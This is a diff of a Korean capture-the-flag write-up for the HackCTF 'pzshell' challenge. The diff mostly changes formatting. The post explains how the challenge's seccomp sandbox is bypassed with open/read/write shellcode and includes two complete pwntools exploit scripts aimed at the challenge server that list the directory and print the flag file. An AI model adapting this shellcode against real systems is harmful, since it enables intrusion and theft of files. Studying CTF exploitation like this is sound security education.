@@ -7,11 +7,6 @@ tags:   [HackCTF]
 categories: [Write-up]
 ---
 
-# [HackCTF] pzshell
-
-Date: Feb 03, 2020
-Tags: report
-
 
 ### 1.  문제
 
@@ -23,7 +18,7 @@ Tags: report
 
 NX비트를 제외하고 다 걸려있다. 이문제는 ezshell 문제에 이어서 RWX 권한이 존재하는 것으로 보인다.
 
-
+<br>
 
 **2) 문제 확인**
 
@@ -31,93 +26,99 @@ NX비트를 제외하고 다 걸려있다. 이문제는 ezshell 문제에 이어
 
 역시 입력을 한번받고 끝난다. 세그폴트가 떳는데 코드를 살펴보자.
 
-
+<br>
 
 **3) 코드흐름 파악**
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <seccomp.h>
+#include <linux/seccomp.h>
+#include <sys/prctl.h>
+#include <fcntl.h>
 
-    #include <stdio.h>
-    #include <string.h>
-    #include <stdlib.h>
-    #include <unistd.h>
-    #include <seccomp.h>
-    #include <linux/seccomp.h>
-    #include <sys/prctl.h>
-    #include <fcntl.h>
-    
-    ...
-    
-    void Init(void)
+...
+
+void Init(void)
+{
+    setvbuf(stdin, 0, 2, 0);
+    setvbuf(stdout, 0, 2, 0);
+    setvbuf(stderr, 0, 2, 0);
+}
+
+int main(void)
+{
+    char s[0x10];
+    char result[0x100] = "\x0F\x05\x48\x31\xED\x48\x31\xE4\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xF6\x48\x31\xFF\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xD2\x4D\x31\xDB\x4D\x31\xE4\x4D\x31\xED\x4D\x31\xF6\x4D\x31\xFF\x66\xbe\xf1\xde";
+    char filter[2] = {'\x0f', '\x05'};
+
+    Init();
+
+    read(0, s, 8);
+
+    for (int i = 0; i < 2; i ++)
     {
-    	setvbuf(stdin, 0, 2, 0);
-    	setvbuf(stdout, 0, 2, 0);
-    	setvbuf(stderr, 0, 2, 0);
+        if (strchr(s, filter[i]))
+        {
+            puts("filtering :)");
+            exit(1);
+        }
     }
-    
-    int main(void)
-    {
-    	char s[0x10];
-    	char result[0x100] = "\x0F\x05\x48\x31\xED\x48\x31\xE4\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xF6\x48\x31\xFF\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xD2\x4D\x31\xDB\x4D\x31\xE4\x4D\x31\xED\x4D\x31\xF6\x4D\x31\xFF\x66\xbe\xf1\xde";
-    	char filter[2] = {'\x0f', '\x05'};
-    
-    	Init();
-    
-    	read(0, s, 8);
-    
-    	for (int i = 0; i < 2; i ++)
-    	{
-    		if (strchr(s, filter[i]))
-    		{
-    			puts("filtering :)");
-    			exit(1);
-    		}
-    	}
-    
-    	strcat(result, s);
-    
-    	sandbox();
-    
-    	(*(void (*)()) result + 2)();
-    }
+
+    strcat(result, s);
+
+    sandbox();
+
+    (*(void (*)()) result + 2)();
+}
+```
+
+<br>
 
 ezshell 과 흐름은 비슷하다. 필터에서는 syscall의 디스어셈인 \x0f\x05가 있다. 처음에 read로 8바이트를 입력가능하다.
 
-또한 추가적으로 sandbox 함수가 존재한다. seccomp 관련 함수는 리눅스 커널에서 샌드박싱을 제공하는 컴퓨터 보안 기능으로서 설정한 syscall을 제외하고는 syscall을 호출불가능하다.
+또한 추가적으로 sandbox 함수가 존재한다. seccomp 관련 함수는 리눅스 커널에서 샌드박싱을 제공하는 컴퓨터 보안 기능으로서 설정한 syscall을 제외하고는 syscall을 호출불가능하다.<br><br>
 
-    void sandbox(void)
+
+```c
+void sandbox(void)
+{
+    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); **//디폴트로 모든것 syscall 허용**
+
+    if (ctx == NULL)
     {
-    	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); **//디폴트로 모든것 syscall 허용**
-    
-    	if (ctx == NULL)
-    	{
-    		write(1, "seccomp error\n", 15);
-    		exit(-1);
-    	}
-    
-    	**//룰을 추가함. 해당 syscall은 호출불가**
-    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork), 0);
-    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork), 0);
-    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(clone), 0);
-    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(creat), 0);
-    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(ptrace), 0);
-    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(prctl), 0);
-    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
-    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
-    
-    	if (seccomp_load(ctx) < 0)
-    	{
-    		seccomp_release(ctx);
-    		write(1, "seccomp error\n", 15);
-    		exit(-2);
-    	}
-    
-    	seccomp_release(ctx);
+        write(1, "seccomp error\n", 15);
+        exit(-1);
     }
 
+    **//룰을 추가함. 해당 syscall은 호출불가**
+    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(clone), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(creat), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(ptrace), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(prctl), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
+
+    if (seccomp_load(ctx) < 0)
+    {
+        seccomp_release(ctx);
+        write(1, "seccomp error\n", 15);
+        exit(-2);
+    }
+
+    seccomp_release(ctx);
+}
+```
+<br>
 결국 execve 함수를 호출하는 것은 불가능하다. 따라서 ORW를 이용하여 문제를 해결해야한다.
 
 
 
-
+<br><br><br>
 
 
 ### 2. 접근방법
@@ -132,6 +133,8 @@ ORW이란. Open, Read, Write syscall을 이용해서 플래그를 읽는 방법�
 
 처음에 read로 8바이트만 입력가능하므로 사이즈 제한을 풀기 위해 8바이트 이내의 다음의 쉘코드를 먼져 보낸다.
 
+<br>
+
     **<resul배열의 마지막 어셈블리 부분>**
     0x000000000000002f:  66 BE F1 DE    mov     si, 0xdef1
     ..
@@ -142,9 +145,11 @@ ORW이란. Open, Read, Write syscall을 이용해서 플래그를 읽는 방법�
     shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFC7+4), vma=0x1, arch='amd64',os='linux')
     shell=shell.ljust(8,"\xcc")
 
+<br>
+
 result의 마지막 쉘코드가 si에 0xdef1을 복사하는 코드다. 따라서 xchg 명령어를 이용해 rsi와 rdx의 값을 바꿔준다. 이렇게 되면 rdx에 0xdef1이 들어가고 바로 syscall의 위치로 jump를 하면 read함수가 호출되면서 사이즈는 0xdef1만큼 입력이 가능하다. 
 
-
+<br>
 
 - **파일이름 읽는 시나리오**
     1. **현재 디렉토리(" . ")를 파일 이름으로 하여 open으로 열기 open(".\x00",0,0)**
@@ -165,7 +170,7 @@ result의 마지막 쉘코드가 si에 0xdef1을 복사하는 코드다. 따라�
 
 ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pzshell/Untitled%202.png)
 
-
+<br>
 
 **파일이름** : S3cr3t_F14g 
 
@@ -185,7 +190,7 @@ result의 마지막 쉘코드가 si에 0xdef1을 복사하는 코드다. 따라�
 ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pzshell/Untitled%203.png)
 
 
-
+<br><br><br>
 
 
 ### 3. 풀이
@@ -193,109 +198,109 @@ result의 마지막 쉘코드가 si에 0xdef1을 복사하는 코드다. 따라�
 ---
 
 - **첫번째 시나리오 코드(파일이름 찾기)**
+```python
+from pwn import *
+#context.log_level="DEBUG"
+context(arch="amd64",os="linux",log_level="DEBUG")
+p=remote("ctf.j0n9hyun.xyz",3038)
+#p=process("./pzshell")
+#gdb.attach(p,'code\nb *0xea0+$code\n')
 
-        from pwn import *
-        #context.log_level="DEBUG"
-        context(arch="amd64",os="linux",log_level="DEBUG")
-        p=remote("ctf.j0n9hyun.xyz",3038)
-        #p=process("./pzshell")
-        #gdb.attach(p,'code\nb *0xea0+$code\n')
-        
-        shell="xchg rsi,rdx;"
-        shell=asm(shell)
-        shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFC7+4), vma=0x1, arch='amd64',os='linux')
-        shell=shell.ljust(8,"\xcc")
-        log.info(len(shell))
-        pause()
-        p.send(shell)
-        
-        open="mov rsp,QWORD PTR fs:[0];"
-        open+="push 0x2e;"
-        open+="lea rdi,[rsp];"
-        open+="xor rdx,rdx;"
-        open+="xor rsi,rsi;"
-        open+="mov rax,2;"
-        open+="syscall;"
-        
-        getdents="mov rdi,rax;"
-        getdents+="lea rsi,[rsp];"
-        getdents+="xor rdx,rdx;"
-        getdents+="xor rax,rax;"
-        getdents+="mov dx,0x3050;"
-        getdents+="mov rax,0x4e;"
-        getdents+="syscall;"
-        
-        write="mov rdx,rax;"
-        write+="xor rax,rax;"
-        write+="xor rdi,rdi;"
-        write+="xor rsi,rsi;"
-        write+="mov rdi,1;"
-        write+="mov rax,1;"
-        write+="lea rsi,[rsp];"
-        write+="syscall"
-        
-        
-        p.send(asm(open)+asm(getdents)+asm(write))
-        p.interactive()
+shell="xchg rsi,rdx;"
+shell=asm(shell)
+shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFC7+4), vma=0x1, arch='amd64',os='linux')
+shell=shell.ljust(8,"\xcc")
+log.info(len(shell))
+pause()
+p.send(shell)
+
+open="mov rsp,QWORD PTR fs:[0];"
+open+="push 0x2e;"
+open+="lea rdi,[rsp];"
+open+="xor rdx,rdx;"
+open+="xor rsi,rsi;"
+open+="mov rax,2;"
+open+="syscall;"
+
+getdents="mov rdi,rax;"
+getdents+="lea rsi,[rsp];"
+getdents+="xor rdx,rdx;"
+getdents+="xor rax,rax;"
+getdents+="mov dx,0x3050;"
+getdents+="mov rax,0x4e;"
+getdents+="syscall;"
+
+write="mov rdx,rax;"
+write+="xor rax,rax;"
+write+="xor rdi,rdi;"
+write+="xor rsi,rsi;"
+write+="mov rdi,1;"
+write+="mov rax,1;"
+write+="lea rsi,[rsp];"
+write+="syscall"
 
 
+p.send(asm(open)+asm(getdents)+asm(write))
+p.interactive()
+```
 
+<br>
 
 - **두번째 시나리오(플래그 출력)**
+```python
+from pwn import *
+#context.log_level="DEBUG"
+context(arch="amd64",os="linux",log_level="DEBUG")
+p=remote("ctf.j0n9hyun.xyz",3038)
+#p=process("./pzshell")
+#gdb.attach(p,'code\nb *0xea0+$code\n')
 
-        from pwn import *
-        #context.log_level="DEBUG"
-        context(arch="amd64",os="linux",log_level="DEBUG")
-        p=remote("ctf.j0n9hyun.xyz",3038)
-        #p=process("./pzshell")
-        #gdb.attach(p,'code\nb *0xea0+$code\n')
-        
-        shell="xchg rsi,rdx;"
-        shell=asm(shell)
-        shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFC7+4), vma=0x1, arch='amd64',os='linux')
-        shell=shell.ljust(8,"\xcc")
-        log.info(len(shell))
-        pause()
-        p.send(shell)
-        
-        open="lea rdi,[rsp];"
-        open+="xor rdx,rdx;"
-        open+="xor rsi,rsi;"
-        open+="mov rax,2;"
-        open+="syscall;"
-        
-        filename="mov rsp,QWORD PTR fs:[0];"
-        filename+=shellcraft.pushstr('S3cr3t_F14g')
-        
-        getdents="mov rdi,rax;"
-        getdents+="lea rsi,[rsp];"
-        getdents+="xor rdx,rdx;"
-        getdents+="xor rax,rax;"
-        getdents+="mov dx,0x3050;"
-        getdents+="mov rax,0x4e;"
-        getdents+="syscall;"
-        
-        read="mov rdx,0x300;"
-        read+="mov rdi,rax;"
-        read+="xor rax,rax;"
-        read+="lea rsi,[rsp];"
-        read+="syscall;"
-        
-        write="mov rdx,rax;"
-        write+="xor rax,rax;"
-        write+="xor rdi,rdi;"
-        write+="xor rsi,rsi;"
-        write+="mov rdi,1;"
-        write+="mov rax,1;"
-        write+="lea rsi,[rsp];"
-        write+="syscall"
-        
-        
-        p.send(asm(filename)+asm(open)+asm(read)+asm(write))
-        p.interactive()
+shell="xchg rsi,rdx;"
+shell=asm(shell)
+shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFC7+4), vma=0x1, arch='amd64',os='linux')
+shell=shell.ljust(8,"\xcc")
+log.info(len(shell))
+pause()
+p.send(shell)
+
+open="lea rdi,[rsp];"
+open+="xor rdx,rdx;"
+open+="xor rsi,rsi;"
+open+="mov rax,2;"
+open+="syscall;"
+
+filename="mov rsp,QWORD PTR fs:[0];"
+filename+=shellcraft.pushstr('S3cr3t_F14g')
+
+getdents="mov rdi,rax;"
+getdents+="lea rsi,[rsp];"
+getdents+="xor rdx,rdx;"
+getdents+="xor rax,rax;"
+getdents+="mov dx,0x3050;"
+getdents+="mov rax,0x4e;"
+getdents+="syscall;"
+
+read="mov rdx,0x300;"
+read+="mov rdi,rax;"
+read+="xor rax,rax;"
+read+="lea rsi,[rsp];"
+read+="syscall;"
+
+write="mov rdx,rax;"
+write+="xor rax,rax;"
+write+="xor rdi,rdi;"
+write+="xor rsi,rsi;"
+write+="mov rdi,1;"
+write+="mov rax,1;"
+write+="lea rsi,[rsp];"
+write+="syscall"
 
 
+p.send(asm(filename)+asm(open)+asm(read)+asm(write))
+p.interactive()
+```
 
+<br><br><br>
 
 
 ### 4. 몰랐던 개념
